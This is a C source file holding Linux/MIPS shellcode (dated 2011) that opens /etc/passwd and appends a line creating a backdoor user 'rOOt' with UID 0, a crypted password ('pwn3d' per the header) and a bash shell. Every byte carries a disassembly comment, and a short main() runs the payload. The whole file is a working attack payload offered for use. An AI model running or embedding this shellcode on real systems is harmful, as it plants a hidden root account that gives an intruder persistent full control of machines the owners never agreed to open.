/* Title:  Linux/MIPS -add user(UID 0) with password - 164 bytes
 * Date:   2011-11-24
 * Author: rigan - imrigan [at] gmail.com
 * Note:
 *         Username - rOOt
 *         Password - pwn3d
 */

#include <stdio.h>

char sc[] =
        "\x24\x09\x73\x50"       //  li      t1,29520
        "\x05\x30\xff\xff"       //  bltzal  t1,400094 <L>
        "\x24\x09\x73\x50"       //  li      t1,29520 (nop)

     /* open("/etc/passwd", O_WRONLY|O_CREAT|O_APPEND); */
        "\x3c\x0f\x30\x2f"       //  lui     t7,0x302f
        "\x35\xef\x65\x74"       //  ori     t7,t7,0x6574
        "\x3c\x0e\x63\x2f"       //  lui     t6,0x632f
        "\x35\xce\x70\x61"       //  ori     t6,t6,0x7061
        "\x3c\x0d\x73\x73"       //  lui     t5,0x7373
        "\x35\xad\x77\x64"       //  ori     t5,t5,0x7764
        "\xaf\xaf\xff\xf3"       //  sw      t7,-13(sp)
	"\xaf\xae\xff\xf7"       //  sw      t6,-9(sp)
	"\xaf\xad\xff\xfb"       //  sw      t5,-5(sp)
        "\xaf\xa0\xff\xff"       //  sw      zero,-1(sp)
	"\x27\xa4\xff\xf4"       //  addiu   a0,sp,-12
        "\x24\x05\x01\x6d"       //  li      a1,365
        "\x24\x02\x0f\xa5"       //  li      v0,4005
        "\x01\x01\x01\x0c"       //  syscall 0x40404

	"\xaf\xa2\xff\xfc"       //  sw      v0,-4(sp)

     /* write(fd, "rOOt:XJ1GV.nyFFMoI:0:0:root:/root:/bin/bash\n", 45);	*/
        "\x8f\xa4\xff\xfc"       //  lw      a0,-4(sp)
        "\x23\xe5\x10\x0c"       //  addi    a1,ra,4108
        "\x20\xa5\xf0\x60"       //  addi    a1,a1,-4000
        "\x24\x09\xff\xd3"       //  li      t1,-45
        "\x01\x20\x30\x27"       //  nor     a2,t1,zero
        "\x24\x02\x0f\xa4"       //  li      v0,4004
        "\x01\x01\x01\x0c"       //  syscall 0x40404

      /* close(fd); */
        "\x24\x02\x0f\xa6"       //  li      v0,4006
        "\x01\x01\x01\x0c"       //  syscall 0x40404

      /* exit(0);  */
       "\x28\x04\xff\xff"        //  slti    a0,zero,-1
       "\x24\x02\x0f\xa1"        //  li      v0,4001
       "\x01\x01\x01\x0c"        //  syscall 0x40404

      /*  "rOOt:XJ1GV.nyFFMoI:0:0:root:/root:/bin/bash\n" */
       "\x72\x4f\x4f\x74"
       "\x3a\x58\x4a\x31"
       "\x47\x56\x2e\x6e"
       "\x79\x46\x46\x4d"
       "\x6f\x49\x3a\x30"
       "\x3a\x30\x3a\x72"
       "\x6f\x6f\x74\x3a"
       "\x2f\x72\x6f\x6f"
       "\x74\x3a\x2f\x62"
       "\x69\x6e\x2f\x62"
       "\x61\x73\x68\x0a";

void main(void)
{
       void(*s)(void);
       printf("size: %d\n", strlen(sc));
       s = sc;
       s();
}